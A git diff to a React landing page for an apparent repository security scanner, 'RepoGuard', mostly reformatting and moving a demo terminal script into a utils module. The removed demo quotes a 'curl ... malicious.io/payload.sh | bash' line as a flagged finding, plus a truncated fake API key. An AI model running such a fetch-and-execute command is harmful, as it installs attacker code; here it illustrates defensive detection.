@@ -7,24 +7,22 @@ import {
   motion,
   AnimatePresence,
   useInView,
-  useMotionValue,
-  useTransform,
-  animate
+  animate,
 } from "motion/react";
 import {
   Terminal as TerminalIcon,
   Check,
   X,
-  ShieldAlert,
+  // ShieldAlert,
   ChevronDown,
   Zap,
-  Cpu,
-  Lock,
+  // Cpu,
+  // Lock,
   ArrowRight,
   Sparkles,
-  AlertTriangle
+  // AlertTriangle
 } from "lucide-react";
-import { ALL_RULES, CHANGELOGS, FAQS } from "@/utils";
+import { ALL_RULES, CHANGELOGS, script, FAQS } from "@/utils";
 
 function GithubIcon({ size = 18 }: { size?: number }) {
   return (
@@ -44,10 +42,14 @@ function GithubIcon({ size = 18 }: { size?: number }) {
   );
 }
 
-
-
 // ─── Stat Counter Helper Component ───────────────────────
-function AnimatedCounter({ value, duration = 2 }: { value: number; duration?: number }) {
+function AnimatedCounter({
+  value,
+  duration = 2,
+}: {
+  value: number;
+  duration?: number;
+}) {
   const nodeRef = useRef<HTMLSpanElement>(null);
   const inView = useInView(nodeRef, { once: true, margin: "-100px" });
 
@@ -61,7 +63,7 @@ function AnimatedCounter({ value, duration = 2 }: { value: number; duration?: nu
         if (nodeRef.current) {
           nodeRef.current.textContent = Math.floor(latest).toString();
         }
-      }
+      },
     });
 
     return () => controls.stop();
@@ -112,37 +114,6 @@ function TerminalTypewriter() {
   const [lines, setLines] = useState<React.ReactNode[]>([]);
   const [step, setStep] = useState(0);
 
-  const script = [
-    { type: "input", text: "git push origin main", delay: 800 },
-    { type: "output", text: "Enumerating objects: 5, done.", delay: 400 },
-    { type: "output", text: "Writing objects: 100% (3/3), 312 bytes | 312.00 KiB/s, done.", delay: 400 },
-    { type: "space", delay: 200 },
-    { type: "blue", text: "→ RepoGuard: scanning 3 changed files...", delay: 800 },
-    { type: "space", delay: 200 },
-    {
-      type: "finding",
-      level: "CRITICAL",
-      rule: "curl-pipe-bash",
-      file: "scripts/setup.sh",
-      match: "curl https://malicious.io/payload.sh | bash",
-      levelColor: "text-brand-red font-semibold",
-      delay: 1000
-    },
-    { type: "space", delay: 300 },
-    {
-      type: "finding",
-      level: "HIGH",
-      rule: "hardcoded-secret",
-      file: "src/config.ts",
-      match: 'api_key = "sk-prod-Xt9mK2..."',
-      levelColor: "text-brand-orange font-semibold",
-      delay: 1000
-    },
-    { type: "space", delay: 400 },
-    { type: "red", text: "✗ Check failed — 2 issue(s) found", delay: 600 },
-    { type: "fix-pr", text: "Merge blocked. Fix PR opened: ", pr: "#47 🔒 RepoGuard: Security fixes", delay: 2000 }
-  ];
-
   useEffect(() => {
     if (step >= script.length) {
       const timer = setTimeout(() => {
@@ -181,11 +152,17 @@ function TerminalTypewriter() {
         renderElement = (
           <div key={step} className="space-y-1">
             <div>
-              <span className={currentLine.levelColor}>✗ {currentLine.level}</span>
+              <span className={currentLine.levelColor}>
+                ✗ {currentLine.level}
+              </span>
               <span className="text-brand-muted"> — </span>
-              <span className="text-brand-white font-semibold">{currentLine.rule}</span>
+              <span className="text-brand-white font-semibold">
+                {currentLine.rule}
+              </span>
               <span className="text-brand-muted"> in </span>
-              <span className="text-brand-yellow font-mono">{currentLine.file}</span>
+              <span className="text-brand-yellow font-mono">
+                {currentLine.file}
+              </span>
             </div>
             <div className="text-brand-muted pl-4 font-mono text-[0.78rem]">
               {currentLine.match}
@@ -202,13 +179,15 @@ function TerminalTypewriter() {
         renderElement = (
           <div key={step} className="text-brand-muted">
             {currentLine.text}
-            <span className="text-[#5ab0ff] underline cursor-pointer">{currentLine.pr}</span>
+            <span className="text-[#5ab0ff] underline cursor-pointer">
+              {currentLine.pr}
+            </span>
           </div>
         );
       }
 
-      setLines(prev => [...prev, renderElement]);
-      setStep(prev => prev + 1);
+      setLines((prev) => [...prev, renderElement]);
+      setStep((prev) => prev + 1);
     }, currentLine.delay);
 
     return () => clearTimeout(timer);
@@ -249,8 +228,8 @@ export default function Home() {
     visible: {
       opacity: 1,
       y: 0,
-      transition: { duration: 0.6, ease: "easeOut" as const }
-    }
+      transition: { duration: 0.6, ease: "easeOut" as const },
+    },
   };
 
   const staggerContainer = {
@@ -258,9 +237,9 @@ export default function Home() {
     visible: {
       opacity: 1,
       transition: {
-        staggerChildren: 0.08
-      }
-    }
+        staggerChildren: 0.08,
+      },
+    },
   };
 
   return (
